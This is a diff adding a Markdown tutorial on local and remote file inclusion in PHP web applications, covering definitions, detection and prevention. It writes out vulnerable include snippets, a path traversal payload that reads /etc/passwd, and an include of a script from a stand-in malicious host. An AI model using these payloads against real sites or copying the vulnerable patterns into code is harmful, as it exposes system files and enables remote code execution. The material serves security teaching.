@@ -1,0 +1,58 @@
+# Local File Inclusion (LFI) and Remote File Inclusion (RFI)
+
+## What is Local File Inclusion (LFI)?
+
+Local File Inclusion (LFI) is a security vulnerability that arises when a file is included without properly sanitizing user-supplied data. Unlike Remote File Inclusion (RFI), the file to be included is located on the same web server hosting the web application.
+
+Attackers exploiting LFI can read sensitive files on the web server, potentially gaining access to files containing passwords and allowing them to reach the server remotely.
+
+## What is Remote File Inclusion (RFI)?
+
+Remote File Inclusion (RFI) is a security vulnerability similar to LFI, occurring when a file is included without adequate data sanitization. The key distinction is that the file to be included is hosted on a different server.
+
+User-provided data in the context of Local File Inclusion (LFI) and Remote File Inclusion (RFI) refers to information or input supplied by users of a web application. This input can come from various sources, such as form submissions, URL parameters, cookies, or any other means through which users interact with the application.
+
+Attackers using RFI host malicious code on their server and invite the victim website to execute it over the remote server.
+
+## How LFI & RFI Work?
+
+Both LFI and RFI vulnerabilities stem from insufficiently sanitizing user-provided data, a common issue in web applications. While SQL Injection, Command Injection, and IDOR vulnerabilities involve data manipulation within the system, LFI and RFI vulnerabilities arise from including user-provided data directly into the system or including a file from a remote server.
+
+### Examples of LFI:
+- include('languages/../../config.php'); 
+- https://example.com/page?lang=en 
+- $lang = $_GET['lang']; include('languages/' . $lang . '.php');
+
+### Examples of RFI:
+- https://example.com/page?script=external_script
+- $script = $_GET['script']; include($script . '.php');
+- include('https://malicious-site.com/evil_script.php');
+
+In the examined code snippet, the web application determines the desired language based on the "language" parameter provided by the user. Under normal circumstances, this functions correctly, generating a file path like "website/en/home.php" for a parameter value such as "en."
+
+However, a security vulnerability arises when an attacker injects a malicious payload into the "language" parameter, leading to the potential display of sensitive files on the server. The payload, "/../../../../../../../../../etc/passwd%00," aims to traverse to the root directory using "../" since the web application's directory location is unknown. The attacker then specifies the inclusion of the "/etc/passwd" file within the web application, with "%00" used to terminate the string.
+
+The manipulated payload becomes "website//../../../../../../../../../etc/passwd%00/home.php." This technique allows the attacker to exploit the Local File Inclusion vulnerability, posing a significant security risk by potentially exposing sensitive system files.
+
+# Leveraging RFI & LFI: Attack Techniques
+
+Attackers exploit Remote File Inclusion (RFI) and Local File Inclusion (LFI) vulnerabilities to achieve various malicious objectives:
+
+- **Code Execution:** Gaining unauthorized execution of arbitrary code.
+- **Sensitive Information Disclosure:** Extracting and revealing sensitive data.
+- **Denial of Service:** Disrupting the normal functioning of a system.
+
+## Preventing LFI & RFI
+
+The primary preventive measure against RFI and LFI attacks is thorough data sanitization before usage. It's crucial to conduct controls on both client-side and server-side to mitigate vulnerabilities, considering that client-based controls can be easily bypassed.
+
+## Detecting LFI & RFI Attacks
+
+Given the potential losses associated with RFI and LFI vulnerabilities, detection and preventive measures are essential. Here's how to detect and prevent such attacks:
+
+- **Examine Web Requests:** Scrutinize all fields in user-submitted web requests.
+- **Check for Special Characters:** Pay attention to special characters like '/', '.', and '\'.
+- **Familiarize with Critical Files:** Understand critical file names frequently targeted in LFI attacks.
+- **Search for HTTP/HTTPS Notations:** Look for acronyms like HTTP and HTTPS, indicative of potential RFI attacks involving external file inclusion.
+
+By implementing these detection methods, organizations can enhance their ability to identify and thwart RFI and LFI attacks effectively.
